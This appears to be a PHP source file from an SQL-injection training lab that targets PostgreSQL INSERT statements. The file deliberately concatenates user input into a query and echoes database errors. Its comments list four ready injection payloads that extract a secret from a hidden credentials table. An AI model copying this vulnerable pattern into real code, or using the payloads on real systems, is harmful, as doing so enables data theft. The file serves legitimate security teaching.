<?php
/*
 * SQLi-Arena. PostgreSQL Lab 15: INSERT / UPDATE Injection
 * SOURCE CODE (shown in White-Box mode)
 *
 * This is the vulnerable portion of the lab.
 */

// Database connection (per-lab isolation)
require_once __DIR__ . '/../../includes/db.php';

// Get user input from query string
$username = $_GET['username'];
$bio = $_GET['bio'];

// VULNERABLE: User input directly concatenated into INSERT statement.
// PostgreSQL's RETURNING clause makes INSERT injection especially powerful --
// an attacker can manipulate what gets returned by the query.
// The bio field is the second parameter and easiest to inject through.
$query = "INSERT INTO profiles (username, bio) VALUES ('$username', '$bio') RETURNING id";

$result = @pg_query($conn, $query);

if ($result && pg_num_rows($result) > 0) {
    $row = pg_fetch_assoc($result);
    echo "Profile created! ID: " . $row['id'];
} elseif ($result) {
    echo "Profile created.";
} else {
    // ERROR MESSAGES DISPLAYED: enables error-based extraction
    echo "Error: " . pg_last_error($conn);
}

// Hidden table structure:
// CREATE TABLE credentials (id SERIAL, service VARCHAR(200), secret VARCHAR(200));
// Contains: ('internal_api', 'FLAG{pg_1ns3rt_r3turn1ng}')
//
// INSERT injection techniques:
// 1. Inject second row: bio = test'), ('hacker', (SELECT secret FROM credentials WHERE service='internal_api')) -- -
// 2. RETURNING manipulation: bio = test') RETURNING (SELECT secret FROM credentials WHERE service='internal_api')::text -- -
// 3. CAST error in VALUES: bio = '||(SELECT secret FROM credentials LIMIT 1)::int || ' -- -
// 4. Subquery in VALUES: bio = ' || (SELECT secret FROM credentials WHERE service='internal_api') || '
//
// PostgreSQL RETURNING is unique. MySQL and SQLite do not support it.
// It allows the INSERT to return arbitrary expressions, not just the inserted row.
